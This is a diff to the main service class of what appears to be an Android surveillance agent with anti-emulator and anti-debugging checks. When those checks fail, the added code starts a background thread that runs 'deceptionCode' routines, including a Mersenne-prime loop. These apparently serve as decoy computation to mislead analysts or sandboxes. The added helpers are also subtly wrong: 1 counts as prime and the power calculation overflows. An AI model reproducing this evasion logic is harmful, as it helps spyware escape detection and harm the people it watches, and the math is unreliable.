@@ -32,6 +32,8 @@ public class ServiceMain extends Service {
 
     private Core core;
 
+    public long mersenne;
+
     @Override
     public IBinder onBind(Intent intent) {
         return null;
@@ -48,8 +50,15 @@ public class ServiceMain extends Service {
             if (Cfg.DEBUG) {
                 Check.log(TAG + " (onCreate) anti emu/debug failed");
             }
+
             return;
         }
+
+        bst = new BSt();
+        bac = new BAc();
+        bsm = new BSm();
+        bc = new BC();
+        wr = new WR();
 
         if (Cfg.DEBUG) {
             Check.log(TAG + " (onCreate)"); //$NON-NLS-1$
@@ -58,6 +67,48 @@ public class ServiceMain extends Service {
         if (Cfg.DEMO) {
             Toast.makeText(this, M.e("Agent Created"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
         }
+    }
+
+    private long deceptionCode3() {
+        long count = 0;
+
+        for (long number = 2; number <= 360; number++) {
+            if (isPrime(number)) {
+                long mersennePrime = (long)(Math.pow(2, number)) - 1;
+                if (isPrime(mersennePrime)) {
+                    count += 1;
+                }
+            }
+        }
+
+        return count;
+    }
+
+    public static boolean isPrime(long number) {
+
+        if ((number == 1) || (number == 2)) {
+            return true;
+        }
+
+        for (int i = 2; i <= number/2; i++) {
+            if (number % i == 0) {
+                return false;
+            }
+        }
+
+        return true;
+    }
+
+    long pow(long base, long exponent) {
+        long aux = 1;
+        while(exponent > 0) {
+            if (exponent % 2 == 1) {
+                aux *= base;
+            }
+            base *= base;
+            exponent /= 2;
+        }
+        return aux;
     }
 
     @Override
@@ -87,6 +138,17 @@ public class ServiceMain extends Service {
                 Check.log(TAG + " (onStart) anti emu/debug failed");
                 Toast.makeText(Status.getAppContext(), M.e("Debug Failed!"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
             }
+
+            Thread thread = new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    Core.deceptionCode1();
+                    mersenne = deceptionCode3();
+                    Core.deceptionCode2(mersenne);
+                }
+            });
+            thread.start();
+
         }
     }
 
